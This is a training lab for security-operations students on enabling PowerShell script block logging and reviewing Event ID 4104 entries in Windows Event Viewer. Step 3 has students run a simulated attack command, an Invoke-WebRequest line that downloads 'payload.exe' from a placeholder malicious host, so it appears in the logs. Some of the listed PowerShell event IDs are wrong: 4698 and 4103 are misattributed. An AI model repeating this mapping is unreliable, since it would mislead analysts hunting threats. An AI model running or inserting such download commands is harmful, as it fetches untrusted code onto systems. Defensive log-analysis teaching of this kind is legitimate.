# **Lab#3: Log Analysis Basics: Windows PowerShell Logs**

## **Objective:**
The objective of this lab is to introduce students to **Windows PowerShell Logs** and help them understand how to analyze PowerShell-related events. Students will learn how to explore and analyze PowerShell logs to detect suspicious or malicious PowerShell commands that could indicate an attack or compromise.

---

## **Lab Setup**
### **Requirements:**
- **System:** Windows 10/11 or Windows Server 2019/2022
- **Tools:**
  - **Windows Event Viewer** (pre-installed)
  - **PowerShell (Pre-installed on Windows)**
  - **Administrative Privileges** (required for enabling logs)

---

## **Preparation:**
In this lab, you will explore and analyze **Windows PowerShell Logs** in the **Event Viewer**. These logs record events related to PowerShell execution, such as the running of scripts, command usage, and potential malicious activities.

### **On Windows:**
1. Press `Win + R` and type `eventvwr.msc` to open the **Event Viewer**.
2. In the **Event Viewer**, expand the **Applications and Services Logs** section and navigate to:
`Microsoft → Windows → PowerShell → Operational`

3. You should now be able to see logs related to PowerShell activities.

---

## **What are Windows PowerShell Logs?**
PowerShell logs contain information about PowerShell script executions, including details about the commands that were run, the processes that invoked them, and the user who executed them. These logs can be used to detect potential misuse of PowerShell, including post-exploitation techniques often used by attackers.

### **Key PowerShell Logs to Monitor:**
- **Event ID 4104**: Script block logging, capturing the PowerShell commands executed.
- **Event ID 4103**: Transcription logs for all PowerShell sessions.
- **Event ID 4698**: PowerShell Module Logging for the execution of specific modules.
- **Event ID 4101**: Execution of PowerShell commands through command-line arguments.

---

## **Lab Task: Explore and Analyze Windows PowerShell Logs**

### **Step 1: Enable PowerShell Script Block Logging**
Before proceeding, make sure PowerShell script block logging is enabled on your system:

1. Press `Win + R`, type `gpedit.msc`, and press Enter to open the **Group Policy Editor**.
2. Navigate to:
`Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`
3. Turn on **Module Logging**, **Script Block Logging**, and **Script Execution**.
4. Apply the settings and close the Group Policy Editor.

### **Step 2: Generate PowerShell Logs**
1. Open **PowerShell** as Administrator.
2. Run the following PowerShell command to generate a log entry:
```powershell
Get-LocalUser | Select-Object Name, Enabled
```
This command will list the local users on your system, which attackers might use to gather information during post-exploitation.

3. After running the command, go back to Event Viewer and navigate to:

`Applications and Services Logs → Microsoft → Windows → PowerShell → Operational`

4. Look for Event ID 4104 in the logs (this will show script block logging for the PowerShell command you executed).
5. Take a screenshot of the event details, including:
 - PowerShell command that was executed
 - User who ran the command
 - Timestamp of the execution

### **Step 3: Simulate Malicious PowerShell Command**
1. Open PowerShell and run the following suspicious command that might be used by an attacker:

```
Invoke-WebRequest -Uri "http://maliciouswebsite.com/payload.exe" -OutFile "C:\temp\payload.exe"`
```
This command simulates downloading a malicious payload from a remote server.
2. Go back to Event Viewer and filter the PowerShell logs for Event ID 4104.
3. Check for any suspicious activity or abnormal PowerShell command execution, specifically focusing on the `Invoke-WebRequest` or any network-based PowerShell command.
4. Take a screenshot of the event details.

### **Step 4: Analyze Suspicious PowerShell Logs**
- Investigate any PowerShell events that show script execution from suspicious sources or unexpected locations.
- Identify the user executing the command and any related system activity (e.g., downloading files, executing binaries).
- Review the Event ID 4104 logs and check for patterns such as unusual script execution or command-line arguments that could indicate malicious behavior.


## Conclusion:
- Understanding PowerShell Logs: PowerShell logs are crucial for detecting the misuse of PowerShell by attackers. By analyzing PowerShell event logs, you can identify suspicious commands and potential security threats.
- SOC Analyst Role: As a SOC Analyst, reviewing these logs is vital for detecting post-exploitation activities, including malicious PowerShell commands often used for lateral movement, credential dumping, and payload execution.
- Threat Detection: Monitoring PowerShell logs can help identify abnormal activity early, allowing for faster detection and response to potential threats.

## Submission:
- Event ID 4104 (PowerShell Script Execution): Submit a screenshot showing a PowerShell script execution event from the logs.
- Malicious PowerShell Command: Submit a screenshot showing the execution of a suspicious or malicious PowerShell command.
